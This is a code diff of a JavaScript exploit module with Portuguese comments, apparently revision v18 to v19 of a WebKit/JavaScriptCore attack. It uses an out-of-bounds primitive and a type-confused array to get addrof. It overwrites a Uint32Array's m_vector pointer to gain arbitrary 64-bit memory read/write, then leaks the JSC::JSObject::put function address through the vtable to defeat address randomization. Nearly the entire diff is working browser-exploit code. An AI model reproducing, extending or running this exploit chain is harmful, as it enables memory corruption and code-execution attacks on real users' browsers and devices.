@@ -1,20 +1,22 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v18 - Final Architecture & Success)
+// js/script3/testArrayBufferVictimCrash.mjs (v19 - Final Bootstrap Architecture)
 // =======================================================================================
 // ESTRATÉGIA FINAL:
-// 1. Corrigida a arquitetura da primitiva de L/E, criando um link funcional direto
-//    entre a estrutura de controle e o TypedArray "mestre" usado para o acesso à memória.
-// 2. Esta é a implementação canônica e robusta que deve produzir o resultado final.
-// 3. Objetivo: Verificar a primitiva e vazar a base do WebKit com sucesso.
+// 1. Arquitetura de L/E corrigida e finalizada, usando um "bootstrap".
+// 2. As primitivas de baixo nível do 'core_exploit.mjs' são usadas para configurar
+//    uma ferramenta de alto nível (o 'master_array'), que é rápida e estável.
+// 3. Esta é a abordagem padrão da indústria e visa o sucesso definitivo do vazamento.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
 import { 
-    triggerOOB_primitive
+    triggerOOB_primitive,
+    arb_read, // Importando a primitiva de baixo nível para o bootstrap
+    arb_write // Importando a primitiva de baixo nível para o bootstrap
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_WebKit_Leak_Final_v18";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_WebKit_Leak_Final_v19";
 
 // --- Funções de Conversão ---
 function int64ToDouble(int64) {
@@ -38,15 +40,17 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Ataque Final com Primitiva Corrigida ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Arquitetura Final com Bootstrap ---`, "test");
 
     let final_result = { success: false, message: "Teste não concluído." };
+    let original_m_vector = null;
+    let m_vector_ptr_addr = null;
 
     try {
         await PAUSE_S3(1000);
 
         // --- FASE 1: OBTENDO PRIMITIVAS DE CONTROLE INICIAL ---
-        logS3("--- FASE 1: Obtendo Primitivas Iniciais (OOB, addrof, fakeobj) ---", "subtest");
+        logS3("--- FASE 1: Obtendo Primitivas Iniciais (OOB, addrof) ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
 
         const confused_array = [13.37];
@@ -55,59 +59,43 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             victim_array[0] = obj;
             return doubleToInt64(confused_array[0]);
         };
-        const fakeobj = (addr) => {
-            confused_array[0] = int64ToDouble(addr);
-            return victim_array[0];
+        logS3("Primitiva 'addrof' operacional.", "good");
+
+        // --- FASE 2: BOOTSTRAP DA FERRAMENTA DE L/E DEFINITIVA ---
+        logS3("--- FASE 2: Construindo a Ferramenta de L/E 'Master Array' ---", "subtest");
+
+        const master_array = new Uint32Array(2);
+        const master_array_addr = addrof(victim_array[0] = master_array);
+        victim_array[0] = null;
+
+        m_vector_ptr_addr = master_array_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
+        logS3(`'master_array' criado. Endereço do seu ponteiro m_vector: ${m_vector_ptr_addr.toString(true)}`, "debug");
+
+        original_m_vector = await arb_read(m_vector_ptr_addr, 8);
+        logS3(`Ponteiro m_vector original salvo: ${original_m_vector.toString(true)}`, "debug");
+
+        const arb_read64 = async (addr) => {
+            await arb_write(m_vector_ptr_addr, addr, 8);
+            return new AdvancedInt64(master_array[0], master_array[1]);
         };
-        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");
 
-        // --- FASE 2: CONSTRUINDO A PRIMITIVA DE L/E COM ARQUITETURA CORRETA ---
-        logS3("--- FASE 2: Construindo Ferramenta de L/E Definitiva ---", "subtest");
-
-        // 1. A estrutura de controle que podemos modificar livremente.
-        const fake_array_struct = {
-            JSCell_Header: null,   // Será clonado de um array real
-            Butterfly_Ptr: null,   // Será clonado de um array real
-            Vector_Ptr: new AdvancedInt64(0xDEADD00D, 0xDEADD00D), // Ponteiro para os dados, que vamos controlar
-            Length_And_Mode: new AdvancedInt64(0x10000, 0x0)      // Comprimento e modo
+        const arb_write64 = async (addr, value) => {
+            await arb_write(m_vector_ptr_addr, addr, 8);
+            master_array[0] = value.low();
+            master_array[1] = value.high();
         };
         
-        // 2. Clonar metadados de um array real para tornar nossa estrutura mais autêntica.
-        const real_array_template = [13.37];
-        const real_array_addr = addrof(victim_array[0] = real_array_template);
-        const real_array_jscell = fakeobj(real_array_addr);
-        fake_array_struct.JSCell_Header = real_array_jscell[0];
-        fake_array_struct.Butterfly_Ptr = real_array_jscell[1];
-        victim_array[0] = null;
-        logS3("Metadados clonados de um array real para a estrutura de controle.", "debug");
-
-        // 3. Criar a nossa ferramenta "mestra" de L/E.
-        const fake_array_struct_addr = addrof(victim_array[0] = fake_array_struct);
-        const master_rw_array = fakeobj(fake_array_struct_addr);
-        victim_array[0] = null;
-        logS3("'master_rw_array' (nosso TypedArray falso) foi criado com sucesso.", "debug");
-
-        // 4. Definir as funções de L/E que usam esta nova arquitetura.
-        const arb_read64 = (addr) => {
-            fake_array_struct.Vector_Ptr = addr; // Aponta nossa ferramenta para o endereço alvo
-            return new AdvancedInt64(master_rw_array[0], master_rw_array[1]); // Usa a ferramenta para ler
-        };
-
-        const arb_write64 = (addr, value) => {
-            fake_array_struct.Vector_Ptr = addr; // Aponta nossa ferramenta para o endereço alvo
-            master_rw_array[0] = value.low();    // Usa a ferramenta para escrever
-            master_rw_array[1] = value.high();
-        };
         logS3("Primitivas de L/E de alto nível ('arb_read64'/'arb_write64') estão prontas.", "good");
 
         // --- FASE 3: VERIFICANDO A PRIMITIVA DEFINITIVA ---
         logS3("--- FASE 3: Verificando a Primitiva de L/E Definitiva ---", "subtest");
+        
         const test_array = [new AdvancedInt64(0x11223344, 0x55667788)];
         const test_array_addr = addrof(victim_array[0] = test_array);
         victim_array[0] = null;
 
-        const butterfly_addr = arb_read64(test_array_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET));
-        const value_read = arb_read64(butterfly_addr);
+        const butterfly_addr = await arb_read64(test_array_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET));
+        const value_read = await arb_read64(butterfly_addr);
         
         if (value_read.equals(test_array[0])) {
             logS3("+++++++++++ SUCESSO! A primitiva de L/E definitiva é 100% funcional. ++++++++++++", "vuln");
@@ -124,7 +112,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         victim_array[0] = null;
         logS3(`   - Endereço do objeto alvo: ${leak_obj_addr.toString(true)}`, "leak");
 
-        const structure_addr = arb_read64(leak_obj_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
+        const structure_addr = await arb_read64(leak_obj_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
         logS3(`2. Lendo ponteiro da Estrutura (Structure) do objeto...`, "info");
         logS3(`   - Endereço da Estrutura: ${structure_addr.toString(true)}`, "leak");
 
@@ -135,7 +123,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`3. Calculando endereço do ponteiro para 'JSC::JSObject::put' na vtable...`, "info");
         logS3(`   - Endereço do ponteiro na vtable: ${js_object_put_func_ptr_addr.toString(true)}`, "leak");
 
-        const js_object_put_func_addr = arb_read64(js_object_put_func_ptr_addr);
+        const js_object_put_func_addr = await arb_read64(js_object_put_func_ptr_addr);
         logS3(`4. Lendo o endereço da função 'JSC::JSObject::put'...`, "info");
         logS3(`   - ENDEREÇO VAZADO DA FUNÇÃO: ${js_object_put_func_addr.toString(true)}`, "vuln");
 
@@ -162,6 +150,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         final_result.message = `Exceção na implementação final: ${e.message}\n${e.stack || ''}`;
         logS3(final_result.message, "critical");
         final_result.success = false;
+    } finally {
+        // Bloco de limpeza para garantir que o ambiente fique o mais estável possível
+        if (original_m_vector && m_vector_ptr_addr) {
+            logS3("Restaurando ponteiro m_vector original do master_array para estabilidade...", "info");
+            await arb_write(m_vector_ptr_addr, original_m_vector, 8).catch(e => logS3(`Erro na limpeza final: ${e.message}`, "warn"));
+        }
     }
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
